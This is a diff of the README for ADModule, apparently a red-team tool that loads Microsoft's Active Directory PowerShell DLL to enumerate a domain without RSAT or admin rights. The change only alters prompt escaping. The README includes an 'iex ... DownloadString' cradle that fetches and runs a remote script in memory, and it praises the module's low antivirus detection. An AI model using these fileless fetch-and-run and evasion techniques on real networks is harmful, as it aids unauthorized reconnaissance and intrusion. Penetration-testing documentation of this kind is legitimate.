@@ -9,22 +9,22 @@ C:\Windows\System32\WindowsPowerShell\v1.0\Modules\ActiveDirectory\
 ## Usage
 You can copy this DLL to your machine and use it to enumerate Active Directory without installing RSAT and without having administrative privileges. 
 
-PS C:\> Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
+PS C:\\> Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
 ![Alt text](/img/AD_Module.png?raw=true "ADModule")
 
 You can also use the Import-ActiveDirectory.ps1 (Thanks to PR by @D1iv3) to load the script using download-execute cradles and without writing the DLL to disk:
 
-PS C:\> iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+PS C:\\> iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
 ![Alt text](/img/AD_Module_Array.png?raw=true "ADModule_Array")
 
 
 To be able to list all the cmdlets in the module, import the module as well. Remember to import the DLL first. 
 
-PS C:\> Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
+PS C:\\> Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
 
-PS C:\> Import-Module C:\AD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1
+PS C:\\> Import-Module C:\AD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1
 
-PS C:\> Get-Command -Module ActiveDirectory
+PS C:\\> Get-Command -Module ActiveDirectory
 
 ## Benefits
 There are many benefits like very low chances of detection by AV, very wide coverage by cmdlets, good filters for cmdlets, signed by Microsoft etc. The most useful one, however, is that this module works flawlessly from PowerShell's Constrained Language Mode
